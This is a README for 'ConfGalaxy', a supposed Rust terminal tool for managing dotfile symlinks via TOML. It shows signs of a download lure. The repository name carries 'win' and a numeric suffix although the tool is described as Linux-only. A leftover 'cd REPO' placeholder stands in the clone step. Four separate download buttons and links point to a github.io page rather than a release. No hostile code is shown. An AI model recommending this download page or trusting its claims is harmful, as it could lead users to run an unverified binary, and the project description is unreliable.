# ConfGalaxy - TUI Configuration Manager 2026

> **ConfGalaxy is a Linux terminal user interface for managing dotfiles through configurable symbolic links, with a TOML-based setup and a Rust implementation.**

[![Platform](https://img.shields.io/badge/Platform-Linux-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/richtertyler4/confgalaxy-win-20657?style=flat-square)](https://github.com/richtertyler4/confgalaxy-win-20657)

---

<p align="center">
  <a href="https://richtertyler4.github.io/confgalaxy-win-20657/">
    <img src="https://img.shields.io/badge/Download-ConfGalaxy%20Latest-brightgreen?style=for-the-badge" alt="Download ConfGalaxy">
  </a>
</p>

> **[Direct Download - ConfGalaxy latest build](https://richtertyler4.github.io/confgalaxy-win-20657/)**

---

[Download Latest Build](https://richtertyler4.github.io/confgalaxy-win-20657/)

---

## About ConfGalaxy

ConfGalaxy is a terminal-based configuration manager for Linux users who organize personal settings as dotfiles. It lets you define symbolic link entries and handle them from an interactive interface instead of repeatedly creating links by hand.

The tool is designed for straightforward configuration workflows: entries can be added, changed, removed, or created in batches. Home-directory paths can be displayed using `~`, while missing parent directories are created automatically when needed.

---

## Features

- Create and manage symbolic link entries
- Select and create multiple symbolic links in one operation
- Edit existing link definitions
- Remove configured links
- Create target parent directories automatically
- Expand and compact home paths with `~`
- Store configuration in TOML format
- Navigate link management through a terminal user interface
- Built with Rust using `ratatui` and `crossterm`
- Uses zero unsafe Rust code

---

## Installation

### Download a build

Use the [latest build download](https://richtertyler4.github.io/confgalaxy-win-20657/) when a prebuilt Linux artifact is available.

### Build from source

Clone the repository and enter its directory:

    git clone https://github.com/richtertyler4/confgalaxy-win-20657.git
    cd REPO

Build and launch ConfGalaxy with Cargo:

    cargo build --release
    cargo run --release

The compiled executable is produced in `target/release/`.

---

## Usage

Start ConfGalaxy from a terminal:

    cargo run --release

A typical workflow is:

1. Open the terminal interface.
2. Add a symbolic link entry for a dotfile or configuration path.
3. Review or edit the configured source and target paths.
4. Select one or more entries for creation.
5. Run the batch creation action.
6. Remove or update entries as your configuration layout changes.

For installed binaries, launch the executable directly from your shell:

    ./target/release/confgalaxy

---

## Configuration

ConfGalaxy uses TOML for its configuration. A basic entry can be represented like this:

    [[links]]
    source = "~/.config/example/config.toml"
    target = "~/dotfiles/example/config.toml"

Use the terminal interface to maintain configured entries. Paths under the home directory may be written with `~`; ConfGalaxy can expand or compact these paths as part of its configuration workflow.

---

## Requirements

- Linux
- A terminal emulator
- Rust and Cargo when building from source
- A writable filesystem location for the configured symbolic links and any parent directories that must be created
- Terminal support compatible with the `crossterm` interface

---

## FAQ

### Who is ConfGalaxy for?

ConfGalaxy is intended for Linux users who manage dotfiles or other configuration files with symbolic links.

### How do I update my link definitions?

Open the relevant entry in the terminal interface and use the edit action to change its configured paths.

### Can I create several links together?

Yes. Select the desired entries and use the batch creation workflow.

### Where is the configuration stored?

Configuration is represented as TOML. The active configuration location depends on how ConfGalaxy is obtained and launched; consult the project files or distribution instructions for the applicable path.

### What happens if a target parent directory does not exist?

ConfGalaxy can create missing target parent directories automatically when creating configured links.

### What should I check if the interface does not start?

Confirm that you are running on Linux, launch the program from a terminal, and verify that a compatible Rust build and terminal environment are available. When building locally, retry with:

    cargo build --release

---

## Roadmap

- Refine symbolic link entry management
- Improve batch link creation workflows
- Continue enhancing TOML configuration handling
- Expand terminal interface usability

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
